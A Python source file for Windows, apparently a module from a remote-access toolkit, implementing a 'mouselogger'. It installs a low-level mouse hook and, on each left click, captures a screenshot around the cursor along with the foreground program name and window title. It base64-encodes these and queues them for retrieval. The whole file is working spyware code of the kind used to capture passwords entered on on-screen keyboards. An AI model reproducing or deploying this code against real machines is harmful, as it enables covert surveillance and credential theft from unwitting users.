# Mostly stolen from Nicolas VERDIER (contact@n1nj4.eu)
# Mostly stolen and recreated by golind
import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
import threading
import time
import datetime
import base64

from ctypes import (
    byref, memset, pointer, sizeof, windll,
    c_void_p as LPRECT,
    c_void_p as LPVOID,
    create_string_buffer,
    Structure,
    POINTER,
    WINFUNCTYPE,
)
import ctypes.wintypes
from ctypes.wintypes import (
    BOOL, DOUBLE, DWORD, HANDLE, HBITMAP, HDC, HGDIOBJ,
    HWND, INT, LPARAM, LONG,RECT,SHORT, UINT, WORD
)

class BITMAPINFOHEADER(Structure):
    _fields_ = [
        ('biSize',          DWORD),
        ('biWidth',         LONG),
        ('biHeight',        LONG),
        ('biPlanes',        WORD),
        ('biBitCount',      WORD),
        ('biCompression',   DWORD),
        ('biSizeImage',     DWORD),
        ('biXPelsPerMeter', LONG),
        ('biYPelsPerMeter', LONG),
        ('biClrUsed',       DWORD),
        ('biClrImportant',  DWORD)
    ]

class BITMAPINFO(Structure):
    _fields_ = [
        ('bmiHeader', BITMAPINFOHEADER),
        ('bmiColors', DWORD * 3)
    ]

# http://nullege.com/codes/show/src@m@o@mozharness-HEAD@external_tools@mouse_and_screen_resolution.py/114/ctypes.windll.user32.GetCursorPos
from ctypes import windll, Structure, c_ulong, byref

class POINT(Structure):
    _fields_ = [("x", c_ulong), ("y", c_ulong)]

def queryMousePosition():
    pt = POINT()
    windll.user32.GetCursorPos(byref(pt))
    return { "x": pt.x, "y": pt.y}

user32 = windll.user32
kernel32 = windll.kernel32
WH_MOUSE_LL=14
WM_MOUSEFIRST=0x0200

psapi = windll.psapi
current_window = None

# Initilisations
SM_XVIRTUALSCREEN = 76
SM_YVIRTUALSCREEN = 77
SM_CXVIRTUALSCREEN = 78
SM_CYVIRTUALSCREEN = 79
SRCCOPY = 0xCC0020  # Code de copie pour la fonction BitBlt()##
DIB_RGB_COLORS = 0

GetSystemMetrics = windll.user32.GetSystemMetrics##
EnumDisplayMonitors = windll.user32.EnumDisplayMonitors
GetWindowDC = windll.user32.GetWindowDC
CreateCompatibleDC = windll.gdi32.CreateCompatibleDC
CreateCompatibleBitmap = windll.gdi32.CreateCompatibleBitmap
SelectObject = windll.gdi32.SelectObject
BitBlt = windll.gdi32.BitBlt
GetDIBits = windll.gdi32.GetDIBits
DeleteObject = windll.gdi32.DeleteObject

# Type des arguments
MONITORENUMPROC = WINFUNCTYPE(INT, DWORD, DWORD,
    POINTER(RECT), DOUBLE)
GetSystemMetrics.argtypes = [INT]
EnumDisplayMonitors.argtypes = [HDC, LPRECT, MONITORENUMPROC, LPARAM]
GetWindowDC.argtypes = [HWND]
CreateCompatibleDC.argtypes = [HDC]
CreateCompatibleBitmap.argtypes = [HDC, INT, INT]
SelectObject.argtypes = [HDC, HGDIOBJ]
BitBlt.argtypes = [HDC, INT, INT, INT, INT, HDC, INT, INT, DWORD]
DeleteObject.argtypes = [HGDIOBJ]
GetDIBits.argtypes = [HDC, HBITMAP, UINT, UINT, LPVOID,
    POINTER(BITMAPINFO), UINT]

# Type de fonction
GetSystemMetrics.restypes = INT
EnumDisplayMonitors.restypes = BOOL
GetWindowDC.restypes = HDC
CreateCompatibleDC.restypes = HDC
CreateCompatibleBitmap.restypes = HBITMAP
SelectObject.restypes = HGDIOBJ
BitBlt.restypes =  BOOL
GetDIBits.restypes = INT
DeleteObject.restypes = BOOL

class MouseLogger(threading.Thread):
    def __init__(self, *args, **kwargs):
        threading.Thread.__init__(self, *args, **kwargs)
        self.hooked  = None
        self.daemon=True
        self.lUser32=user32
        self.pointer=None
        self.stopped=False
        self.screenshots=[]

    def run(self):
        if self.install_hook():
            #print "mouselogger installed"
            pass
        else:
            raise RuntimeError("couldn't install mouselogger")
        msg = MSG()
        user32.GetMessageA(byref(msg),0,0,0)
        while not self.stopped:
            time.sleep(1)
        self.uninstall_hook()
            
    def stop(self):
        self.stopped=True

    def retrieve_screenshots(self):
        screenshot_list=self.screenshots
        self.screenshots=[]
        return screenshot_list

    def get_screenshot(self):
        pos = queryMousePosition()

        limit_width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
        limit_height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
        limit_left = GetSystemMetrics(SM_XVIRTUALSCREEN)
        limit_top = GetSystemMetrics(SM_YVIRTUALSCREEN)

        height = min(100,limit_height)
        width = min(200,limit_width)
        left = max(pos['x']-100,limit_left)
        top = max(pos['y']-50,limit_top)

        srcdc = GetWindowDC(0)
        memdc = CreateCompatibleDC(srcdc)
        bmp = CreateCompatibleBitmap(srcdc, width, height)
        try:
            SelectObject(memdc, bmp)
            BitBlt(memdc, 0, 0, width, height, srcdc, left, top, SRCCOPY)
            bmi = BITMAPINFO()
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
            bmi.bmiHeader.biWidth = width
            bmi.bmiHeader.biHeight = height
            bmi.bmiHeader.biBitCount = 24
            bmi.bmiHeader.biPlanes = 1
            buffer_len = height * ((width * 3 + 3) & -4)
            pixels = create_string_buffer(buffer_len)
            bits = GetDIBits(memdc, bmp, 0, height, byref(pixels),
                pointer(bmi), DIB_RGB_COLORS)
        finally:
            DeleteObject(srcdc)
            DeleteObject(memdc)
            DeleteObject(bmp)

        if bits != height or len(pixels.raw) != buffer_len:
            raise ValueError('MSSWindows: GetDIBits() failed.')

        return pixels.raw, height, width

    def install_hook(self):
        CMPFUNC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        self.pointer = CMPFUNC(self.hook_proc)
        self.hooked = self.lUser32.SetWindowsHookExA(WH_MOUSE_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
        if not self.hooked:
            return False
        return True
    
    def uninstall_hook(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def hook_proc(self, nCode, wParam, lParam):
        ##http://www.pinvoke.net/default.aspx/Constants.WM
        if wParam == 0x201:
            buf, height, width = self.get_screenshot()
            exe, win_title="unknown", "unknown"
            try:
                exe, win_title=get_current_process()
            except Exception:
                pass
            self.screenshots.append((str(datetime.datetime.now()), height, width, exe, win_title, base64.b64encode(buf)))
        return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)

#credit: Black Hat Python - https://www.nostarch.com/blackhatpython
def get_current_process():
    hwnd = user32.GetForegroundWindow()
    
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    
    #process_id = "%d" % pid.value
    
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
    
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    #return "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    return executable.value, window_title.value

def get_mouselogger():
    if not hasattr(sys, 'MOUSELOGGER_THREAD'):
        sys.MOUSELOGGER_THREAD=MouseLogger()
    return sys.MOUSELOGGER_THREAD
    
    

if __name__=="__main__":
    ml = MouseLogger()
    ml.start()
    while True:
        for d, height, width, exe, win_title, buf in ml.retrieve_screenshots():
            print "screenshot of %s/%s taken at %s (%s bytes) from %s : %s "%(height, width, d, len(buf), exe, win_title)
        time.sleep(1)
